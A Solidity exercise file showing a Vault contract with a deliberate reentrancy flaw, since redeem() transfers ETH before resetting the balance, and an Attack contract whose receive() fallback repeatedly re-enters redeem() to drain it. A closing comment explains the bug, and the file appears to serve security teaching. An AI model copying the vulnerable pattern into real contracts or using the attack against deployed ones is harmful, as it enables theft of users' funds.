// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

//*** Exercice 4 ***//
// You can store ETH in this contract and redeem them.
contract Vault {
    mapping(address => uint) public balances;

    /// @dev Store ETH in the contract.
    function store() public payable {
        balances[msg.sender]+=msg.value;
    }
    
    /// @dev Redeem your ETH.
    function redeem() public {
        msg.sender.call{ value: balances[msg.sender] }("");
        balances[msg.sender]=0;
    }
}

contract Attack {
    Vault public vault;

    constructor(address storeAddress) payable {
        vault = Vault(storeAddress);
    }

    receive() external payable {
        if(address(vault).balance >= 1 ether) {
            vault.redeem();
        }
    }

    function attack() external payable {
        vault.store{value: msg.value}();
        vault.redeem();
    }
}

// The above is a classic Reentrancy case where the redeem() function can easily
// be exploited as the balance associated with msg.sender is updated AFTER the actual transfer.